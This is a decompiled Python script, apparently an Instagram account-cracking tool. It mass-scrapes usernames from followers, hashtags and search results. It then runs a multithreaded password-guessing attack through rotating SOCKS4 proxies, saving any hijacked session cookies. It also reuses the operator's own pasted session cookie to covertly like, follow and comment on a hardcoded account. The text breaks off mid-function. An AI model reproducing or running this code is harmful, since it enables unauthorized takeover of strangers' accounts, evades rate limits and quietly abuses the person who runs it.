# -*- coding: utf-8 -*-
# Decompile by MrGhostOfficial:)
# uncompyle6 version 3.7.4
# Decompiler: mardis
# Python version 3.11.4
# Python2 version 2.7.18 (default, 2023-06-14 13:42:04.103358
import os, re, sys, time, json, random, requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from time import sleep
#Normal below are the colors
white = '\x1b[1;37;40m'
red = '\x1b[1;31;40m'
yellow = '\x1b[1;33;40m'
green = '\x1b[1;32;40;40m'
purple = '\x1b[1;35;40m'
black = '\x1b[1;30;40m'
blue = '\x1b[1;34;40m'
cyan = '\x1b[1;36;40m'
finished = '\x1b[0m'
#Lite below are the colors
whitelite = '\x1b[0;37;40m'
redlite = '\x1b[0;31;40m'
yellowlite = '\x1b[0;33;40m'
greenlite = '\x1b[0;32;40m'
purplelite = '\x1b[0;35;40m'
blacklite = '\x1b[0;30;40m'
bluelite = '\x1b[0;34;40m'
cyanlite = '\x1b[0;36;40m'
#To mix below are the colors
bluewhitemix = '\x1b[0;37;44m'
purplewhitemix = '\x1b[0;37;45m'
greenredmix = '\x1b[1;32;41m'
bluemix = '\x1b[1;37;44m'
ibluemix = '\x1b[1;34;47m'
ipurplemix = '\x1b[1;35;47m'
my_color = [
 white, red, yellow, green, purple, black, blue, cyan]
randmclor = random.choice(my_color)
randomcolor = random.choice(my_color)
#×××××××××××××××××××××××××××××××××××:
# Logo
___logo___ = (f"""{red}
⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀
⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⢹⣿⣆    ╔══╗─────╔╗
⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠉⠛⠻⢿⣿⣿⣷⣶⣾⣿⣿    ╚╣╠╝────╔╝╚╗
⣿⣿⣿⣿⣿⡿⠋⠀⠀⣀⣠⣄⣀⠀⠀⠙⢿⣿⣿⣿⣿⣿    ─║║╔═╗╔═╩╗╔╬══╦══╦═╦══╦╗╔╗
⣿⣿⣿⣿⣿⠁⠀⢠⣾⣿⣿⣿⣿⣷⡄⠀⠈⣿⣿⣿⣿⣿    ─║║║╔╗╣══╣║║╔╗║╔╗║╔╣╔╗║╚╝║
⣿⣿⣿⣿⡇⠀⠀⢾⣿⣿⣿⣿⣿⣿⡷⠀⠀⢸⣿⣿⣿⣿    ╔╣╠╣║║╠══║╚╣╔╗║╚╝║║║╔╗║║║║
⣿⣿⣿⣿⣿⡀⠀⠘⢿⣿⣿⣿⣿⡿⠃⠀⢀⣿⣿⣿⣿⣿    ╚══╩╝╚╩══╩═╩╝╚╩═╗╠╝╚╝╚╩╩╩╝
⣿⣿⣿⣿⣿⣷⣄⠀⠀⠉⠙⠋⠉⠀⠀⣠⣾⣿⣿⣿⣿⣿    ──────────────╔═╝║
⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿    v1 ───────────╚══╝
⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏
⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀{finished}\n""")
# Login Cookie
def ___login___():
    os.system('clear')
    print(___logo___)
    print(f"{cyan}[{white}•{cyan}]{white} Enter Instagram cookies, you can collect cookies using kiwi browser.apk, if you want to download apk & extension type {red}[{white}Open{red}]{white}\n")
    ___cookie = input(f"{black}[{white}?{black}]{white} Cookie: {green}")
    if ___cookie in ['open', 'Open', 'OPEN']:
        print(f"{black}[{white}!{black}]{white} You will be redirect to MrGhost folder access, permission allow...")
        sleep(3)
        os.system('xdg-open https://mega.nz/file/Zb9hyQoY#tfpOsdSNDRqQ1VUBa7s85I-ed6H5n2Cf_YHlKHlwBwQ')
        os.system('xdg-open https://mega.nz/file/QH0GHTwR#8apdQYkbZH2WDEjTt21eldsejoECnetlMMX0BebZYfA')
        exit()
    elif ___cookie in ['', ' ']:
        exit(f"{white}[{red}!{white}]{red} Don't be empty")
    else:
        try:
            ___userid = re.search('ds_user_id=(.*?);', ___cookie)
            open('Data/iguser_id.txt', 'w').write(___userid.group(1))
            ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': ___cookie}).json()['user']
            open('Data/igcookie.txt', 'w').write(___cookie)
            print(f"{black}[{white}*{black}]{white} Welcome :{yellow} {___roz['full_name']}")
            ___follow___()
        except (AttributeError, KeyError):
            exit(f"{white}[{red}!{white}]{red} Maybe your cookie expired, collect and try again.\n")
        except (ConnectionError):
            exit(f"{red}!] Connection Error{white}!")
# Follow Cookie
def ___follow___():
    try:
        ___cookie = open('Data/igcookie.txt', 'r').read()
        ___session = re.search('sessionid=(.*?);', ___cookie)
        ___teks = random.choice(['hello bro 😍', 'Hey bro, how are you ', 'Permission to use the script ', 'Good cuss ', 'Programmer cuss ', 'Greetings Bang Bang 🤗','I love you ❤️'])
        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
        with requests.Session() as ses:
            ___like = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___follow = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___komen = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}, data = ___data).text #Jangan Di ubah!
            if '"status":"ok"' in str(___follow):
                print(f"{black}[{white}!{black}]{white} Login Succeed")
                ___menu___()
            else:
                print(f"{white}[{red}!{white}]{white} Cookie Invalid{finished}")
                sleep(3)
                os.system('rm -rf Data/igcookie.txt')
                ___login___()
    except Exception as e:
        print(f"{white}[{red}!{white}]{white} Cookie Invalid{finished}")
        sleep(3)
        os.system('rm -rf Data/igcookie.txt')
        ___login___()
# Menu
def ___menu___():
    try:
        os.system('clear')
        print(___logo___)
        ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{open("Data/iguser_id.txt","r").read()}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()}).json()['user']
        print(f"{cyan}[{white}*{cyan}]{white} Welcome  :{yellow} {___roz['full_name']}")
        print(f"{cyan}[{white}*{cyan}]{white} Username :{yellow} {___roz['username']}")
        print(f"{cyan}[{white}*{cyan}]{white} Follower :{yellow} {___roz['follower_count']}\n")
    except (IOError):
        print(f"{white}[{red}!{white}]{white} Cookie Invalid{finished}")
        sleep(3)
        ___login___()
    except (KeyError):
        print(f"{white}[{red}!{white}]{white} Cookie Invalid{finished}")
        os.system('rm -rf Data/igcookie.txt && rm -rf Data/iguser_id.txt')
        sleep(3)
        ___login___()
    except (IOError):
        exit(f"{red}!] Connection Error{white}!")
    print(f"{cyan}[{white}4{cyan}]{white} Dump Username From Profile")
    print(f"{cyan}[{white}2{cyan}]{white} Dump Username From Follower")
    print(f"{cyan}[{white}1{cyan}]{white} Dump Username From Following")
    print(f"{cyan}[{white}3{cyan}]{white} Dump Username From Activity")
    print(f"{cyan}[{white}5{cyan}]{white} Dump Username From Hastag")
    print(f"{cyan}[{white}6{cyan}]{white} Dump Username From Search")
    print(f"{cyan}[{white}7{cyan}]{white} Dump Username From Query")
    print(f"{cyan}[{white}8{cyan}]{white} Dump User From Email")
    print(f"{cyan}[{white}9{cyan}]{white} Start Crack {white}[{black}Fast{white}]{black}")
    print(f"{cyan}[{white}0{cyan}]{white} View Results Crack")
    print(f"{cyan}[{white}A{cyan}]{white} Logout program {white}[{red}Exit{white}]{red}\n")
    ___pilih = input(f"{black}[{white}?{black}]{white} Choose :{yellow} ")
    if ___pilih in ['1','01']:
        ___mengikuti___()
    elif ___pilih in ['2','02']:
        ___pengikut___()
    elif ___pilih in ['3','03']:
        ___activity___()
    elif ___pilih in ['4','04']:
        ___beranda___()
    elif ___pilih in ['5','05']:
        ___hastag___()
    elif ___pilih in ['6','06']:
        ___search___()
    elif ___pilih in ['7','07']:
        ___query___()
    elif ___pilih in ['8','08']:
        ___email___()
    elif ___pilih in ['9','09']:
        ___proxy___()
    elif ___pilih in ['0','00']:
        try:
            print(f"\n{black}[{white}1{black}]{white} View Results Ok")
            print(f"{black}[{white}2{black}]{white} View Results Cp")
            ___Results = input(f"\n{cyan}[{white}?{cyan}]{white} Pilih :{yellow} ")
            if ___Results in ['1','01']:
                print(f"{white} ")
                os.system('cat Results/Ok.txt')
            elif ___Results in ['2','02']:
                print(f"{white} ")
                os.system('cat Results/Cp.txt')
            elif ___Results in ['3','03']:
                ___menu___()
            else:
                exit(f"{white}[{red}!{white}]{red} Wrong Input")
        except:pass
    elif ___pilih in ['a','A']:
        print(f"{white}[{yellow}!{white}]{yellow} Deleting Cookies...")
        os.system('rm -rf Data/igcookie.txt && rm -rf Data/iguser_id.txt')
        exit()
    else:
        exit(f"{white}[{yellow}!{white}]{red} Wrong Input")
# Dump Mengikuti
def ___mengikuti___():
    try:
        ___user = input(f"\n{black}[{white}?{black}]{white} User :{yellow} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{white}[{red}!{white}]{red} Gunakan Username")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()}).json()['graphql']['user']
            print(f"{black}[{white}?{black}]{white} Name :{yellow} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/following/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+' | '+z['full_name']+'\n')
                print(f"{white}{z['username']} | {z['full_name']}")
            print(f"\n{cyan}[{white}*{cyan}]{white} Finished...")
            print(f"{cyan}[{white}?{cyan}]{white} File Saved In :{yellow} Dump/{___file}")
            input(f"\n{red}[ {white}Enter Back {red}]{finished}")
            ___menu___()
    except (KeyError):
        exit(f"{white}[{red}!{white}]{red} Dump Gagal")
    except (ConnectionError):
        exit(f"{white}[{red}!{white}]{red} Connection Error!")
# Dump Pengikut
def ___pengikut___():
    try:
        ___user = input(f"\n{black}[{white}?{black}]{white} User :{yellow} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{white}[{red}!{white}]{red} Gunakan Username")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()}).json()['graphql']['user']
            print(f"{black}[{white}?{black}]{white} Name :{yellow} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/followers/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+' | '+z['full_name']+'\n')
                print(f"{white}{z['username']} | {z['full_name']}")
            print(f"\n{cyan}[{white}*{cyan}]{white} Finished...")
            print(f"{cyan}[{white}?{cyan}]{white} File Saved In :{yellow} Dump/{___file}")
            input(f"\n{red}[ {white}Enter Back {red}]{finished}")
            ___menu___()
    except (KeyError):
        exit(f"{white}[{red}!{white}]{red} Dump Gagal")
    except (ConnectionError):
        exit(f"{red}!] Connection Error{white}!")
# Dump Activity
def ___activity___():
    try:
        ___file = input(f"\n{black}[{white}?{black}]{white} Name File :{yellow} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{white}[{red}!{white}]{red} Jangan Kosong")
        else:
            print(f"{white} ")
            ___roz = requests.get('https://www.instagram.com/accounts/activity/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()})
            ___zak = re.findall('"username":"(.*?)","full_name":"(.*?)",', ___roz.text)
            for z in ___zak:
                open('Dump/'+___file, 'a').write(z[0]+' | '+z[1]+'\n')
                print(f"{z[0]} | {z[1]}")
            print(f"\n{cyan}[{white}*{cyan}]{white} Finished...")
            print(f"{cyan}[{white}?{cyan}]{white} File Saved In :{yellow} Dump/{___file}")
            input(f"\n{red}[ {white}Enter Back {red}]{finished}")
            ___menu___()
    except Exception as e:
        exit(f"{white}[{red}!{white}]{red} {e}")
# Dump Beranda
def ___beranda___():
    try:
        ___file = input(f"\n{black}[{white}?{black}]{white} Name File :{yellow} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{white}[{red}!{white}]{red} Jangan Kosong")
        else:
            print(f"{white} ")
            ___roz = requests.get('https://i.instagram.com/api/v1/feed/reels_tray/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()}).json()
            for z in ___roz['tray']:
                open('Dump/'+___file, 'a').write(z['user']['username']+' | '+z['user']['full_name']+'\n')
                print(f"{z['user']['username']} | {z['user']['full_name']}")
            print(f"\n{cyan}[{white}*{cyan}]{white} Finished...")
            print(f"{cyan}[{white}?{cyan}]{white} File Saved In :{yellow} Dump/{___file}")
            input(f"\n{red}[ {white}Enter Back {red}]{finished}")
            ___menu___()
    except (KeyError):
        exit(f"{white}[{red}!{white}]{red} Dump Gagal")
    except (ConnectionError):
        exit(f"{white}[{red}!{white}]{red} Connection Error!")
# Dump Hastag
def ___hastag___():
    try:
        ___tag = input(f"\n{black}[{white}?{black}]{white} Hastag :{yellow} ").replace('#','')
        if ___tag in ['',' ']:
            exit(f"{white}[{red}!{white}]{red} Jangan Kosong")
        ___file = input(f"{black}[{white}?{black}]{white} Name File :{yellow} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{white}[{red}!{white}]{red} Jangan Kosong")
        else:
            print(f"{white} ")
            ___roz = requests.get(f'https://www.instagram.com/explore/tags/{___tag}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()})
            ___zak = re.findall('"username":"(.*?)","full_name":"(.*?)",', ___roz.text)
            for z in ___zak:
                open('Dump/'+___file, 'a').write(z[0]+' | '+z[1]+'\n')
                print(f"{z[0]} | {z[1]}")
            print(f"\n{cyan}[{white}*{cyan}]{white} Finished...")
            print(f"{cyan}[{white}?{cyan}]{white} File Saved In :{yellow} Dump/{___file}")
            input(f"\n{red}[ {white}Enter Back {red}]{finished}")
            ___menu___()
    except Exception as e:
        exit(f"{white}[{red}!{white}]{red} {e}")
# Dump Search
def ___search___():
    try:
        ___user = input(f"\n{black}[{white}?{black}]{white} User :{yellow} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{white}[{red}!{white}]{red} Gunakan Username")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()}).json()['graphql']['user']
            print(f"{black}[{white}?{black}]{white} Name :{yellow} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id={___roz["id"]}&include_friendship_status=true', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+' | '+z['full_name']+'\n')
                print(f"{white}{z['username']} | {z['full_name']}")
            print(f"\n{black}[{white}*{black}]{white} Finished...")
            print(f"{black}[{white}?{black}]{white} File Saved In :{yellow} Dump/{___file}")
            input(f"\n{red}[ {white}Enter Back {red}]{finished}")
            ___menu___()
    except (KeyError):
        exit(f"{white}[{red}!{white}]{red} Dump Gagal")
    except (ConnectionError):
        exit(f"{red}!] Connection Error{white}!")
# Dump Query
def ___query___():
    try:
        ___query = input(f"\n{black}[{white}?{black}]{white} Query :{yellow} ")
        if ___query in ['',' ']:
            exit(f"{white}[{red}!{white}]{red} Jangan Kosong")
        else:
            print(f"{white} ")
            ___file = ___query.replace(' ','_')+'.txt'
            ___roz = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={___query}&rank_token=0.3953592318270893&count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()}).json()
            for z in ___roz['users']:
                open('Dump/'+___file, 'a').write(z['user']['username']+' | '+z['user']['full_name']+'\n')
                print(f"{z['user']['username']} | {z['user']['full_name']}")
            print(f"\n{cyan}[{white}*{cyan}]{white} Finished...")
            print(f"{cyan}[{white}?{cyan}]{white} File Saved In :{yellow} Dump/{___file}")
            input(f"\n{red}[ {white}Enter Back {red}]{finished}")
            ___menu___()
    except (KeyError):
        exit(f"{white}[{red}!{white}]{red} Dump Gagal")
    except (ConnectionError):
        exit(f"{red}!] Connection Error{white}!")
# Dump Dari Email
def ___email___():
    try:
        ___name = input(f"\n{black}[{white}?{black}]{white} Name :{yellow} ").replace(' ','')
        if ___name in ['',' ']:
            exit(f"{white}[{red}!{white}]{red} Jangan Kosong")
        ___domain = input(f"{black}[{white}?{black}]{white} Domain :{yellow} ")
        if ___domain in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
            ___limit = int(input(f"{black}[{white}?{black}]{white} Limit :{yellow} "))
            if ___limit >=1001:
                exit(f"{white}[{red}!{white}]{red} Maksimal 1000")
            else:
                print(f"{white} ")
                ___file = 'Dump/'+___name+'.txt'
                for _ in range(___limit):
                    ___nomor = random.randint(1, 999)
                    ___user = ___name + str(___nomor) + ___domain + ' | ' + ___name + ' ' + str(___nomor)
                    open(___file, 'a').write(f'{___user}\n')
                    print(f"{___user}")
                print(f"\n{cyan}[{white}*{cyan}]{white} Finished...")
                print(f"{cyan}[{white}?{cyan}]{white} File Saved In :{yellow} {___file}")
                input(f"\n{red}[ {white}Enter Back {red}]{finished}")
                ___menu___()
        else:
            exit(f"{white}[{red}!{white}]{red} Domain '@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com'")
    except Exception as e:
        exit(f"{white}[{red}!{white}]{red} {e}")
# Proxy
def ___proxy___():
    try:
        ___roz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
        open('Data/proxy.txt', 'w').write(___roz)
    except Exception as e:
        ___roz = requests.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy2.txt').text
        open('Data/proxy.txt', 'w').write(___roz)
    ___crack___()
# Crack
class ___crack___:
    
    def __init__(self):
        self.kill = 0
        self.ok = []
        self.cp = []
        print(f"\n{black}[{white}1{black}]{white} Use Password {black}[{yellow}name, name123, name12345{black}]{yellow}")
        print(f"{black}[{white}2{black}]{white} Use Password {black}[{yellow}name, name123, name1234, name12345{black}]{yellow}")
        print(f"{black}[{white}3{black}]{white} Use Password {black}[{yellow}name, name123, name1234, name12345, name123456{black}]{yellow}")
        print(f"{black}[{white}4{black}]{white} Use Password Manual {black}[{yellow}>5{black}]{yellow}\n")
        ___pilih = input(f"{cyan}[{white}?{cyan}]{white} Choose :{black} ")
        if ___pilih in ['4','04']:
            pwx = input(f"{cyan}[{white}?{cyan}]{white} Password :{black} ").split(',')
        try:
            self.___dump = input(f"{cyan}[{white}?{cyan}]{white} File Dump :{black} ")
            self.___file = open(self.___dump, 'r').read().splitlines()
        except (IOError):
            exit(f"{white}[{red}!{white}]{red} File Doesn't Exist")
        try:
            print(f"\n{black}[{white}•{black}]{white} Results Ok Saved In Results/Ok.txt")
            print(f"{black}[{white}•{black}]{white} Results Cp Saved In Results/Cp.txt\n")
            with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                for ___user in self.___file:
                    username, name = ___user.split(' | ')
                    z = name.split(' ')
                    if ___pilih in ['1','01']:
                        password = [name.replace(' ',''), name, z[0]+'123', z[0]+'12345']
                    elif ___pilih in ['2','02']:
                        password = [name.replace(' ',''), name, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    elif ___pilih in ['3','03']:
                        password = [name.replace(' ',''), name, z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'123456']
                    elif ___pilih in ['4','04']:
                        password = pwx
                    else:
                        password = [name.replace(' ',''), name, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    ___hayuk.submit(self.__main__, self.___file, username, password)
            exit(f"\n{red}[{white}Finished{red}]{white}")
        except (ValueError):
            exit(f"{white}[{red}!{white}]{red} Crack Completed. Looks like there is an error. Please dump again!")
    def __main__(self, user, uid, pwx):
        try:
            ___useragent = open('Data/user-agent.txt', 'r').read()
        except (IOError):
            ___useragent = ('Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36')
        try:
            for pw in pwx:
                pw = pw.lower()
                ___url = ('https://www.instagram.com/')
                ___login = ('https://www.instagram.com/accounts/login/ajax/')
                ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                ___csrf = requests.get(___url).cookies['csrftoken']
                ___data = {'username': uid,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
                'queryParams': {},
                'optIntoOneTap': 'false'}
                ___head = {'User-Agent': random.choice(open("Data/user-agent.txt","r").read().splitlines()),
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'x-csrftoken': ___csrf}
                with requests.Session() as ses:
                    response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
                    if 'userId' in str(response):
                        coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"')
                        try:
